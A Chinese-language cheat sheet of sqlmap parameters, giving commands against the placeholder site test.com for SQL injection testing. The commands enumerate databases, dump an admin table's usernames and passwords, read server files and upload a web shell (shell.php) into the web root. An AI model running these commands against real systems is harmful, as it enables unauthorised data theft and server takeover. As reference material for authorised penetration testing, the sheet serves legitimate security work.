# SQLMAP常用参数

## 一、目标指定类
### 1. -u 指定 GET 注入 URL

作用：传入带参数的目标链接

```
sqlmap -u "http://test.com/?id=1"
```

### 2. -r 加载抓包 HTTP 数据包
作用：读取保存的请求包，自动识别 POST/Cookie 注入

```
sqlmap -r http.txt
```

### 3. -p 只检测指定参数

作用：忽略其他参数，仅扫描指定参数

```
sqlmap -u "http://test.com/?id=1&page=2" -p id
```

### 4. --data POST 表单传参
作用：模拟 POST 提交数据

```
sqlmap -u "http://test.com/login.php" --data "user=1&pwd=1"
```

### 5. --cookie 自定义 Cookie
作用：携带 Cookie 访问页面
```
sqlmap -u "http://test.com/?id=1" --cookie="session=123456"

```


## 二、身份认证类
### 1. --auth-type=basic 开启 401 基础认证

### 2. --auth-cred=user:pass 账号密码
```
sqlmap -u "http://test.com" --auth-type=basic --auth-cred=admin:123456
```
### 3. --proxy 设置代理

```
sqlmap -u "http://test.com" --proxy http://127.0.0.1:8080
```

# 三、交互自动化
### --batch 自动确认所有交互

```
sqlmap -u "http://test.com/?id=1" --batch

```
# 四、查询数据库信息
### 1. --dbs 枚举全部数据库

```
sqlmap -u "http://test.com/?id=1" --batch --dbs

```
### 2. --current-db 当前使用数据库

```
sqlmap -u "http://test.com/?id=1" --batch --current-db

```
### 3. --current-user 当前数据库账号

```
sqlmap -u "http://test.com/?id=1" --batch --current-user

```
### 4. --version 数据库版本

```
sqlmap -u "http://test.com/?id=1" --batch --version

```
### 5. --is-dba 判断是否为管理员权限

```
sqlmap -u "http://test.com/?id=1" --batch --is-dba

```
# 五、库、表、字段操作
### 1. -D 指定数据库 + --tables 查表

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb --tables

```
### 2. -T 指定数据表 + --columns 查字段

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb -T admin --columns

```
### 3. --dump 导出表内所有数据

```
sqlmap -u "http://test.com/?id=1" --batch -D testdb -T admin --dump

```
### 4. --dump-all 导出全部库表（速度慢）

```
sqlmap -u "http://test.com/?id=1" --batch --dump-all

```
# 六、自定义执行 SQL 语句
### --sql-query 手动执行查询

```
sqlmap -u "http://test.com/?id=1" --batch --sql-query "select username,password from admin"

```
# 七、盲注提速
### --threads 设置多线程

```
sqlmap -u "http://test.com/?id=1" --batch --threads 10

```
# 八、文件读写（高权限数据库可用）
### 1. --file-read 读取服务器文件

```
sqlmap -u "http://test.com/?id=1" --batch --file-read "C:/www/index.php"

```
### 2. --file-write 上传本地文件到服务器

```
sqlmap -u "http://test.com/?id=1" --batch --file-write shell.php --file-dest "C:/www/shell.php"

```
# 九、限定注入类型
B = 布尔盲注
T = 时间盲注
U = 联合注入

只使用布尔+时间盲注
```
sqlmap -u "http://test.com/?id=1" --batch --technique BT

```
# 十、清空历史扫描缓存
--flush-session

```
sqlmap -u "http://test.com/?id=1" --batch --flush-session

```



















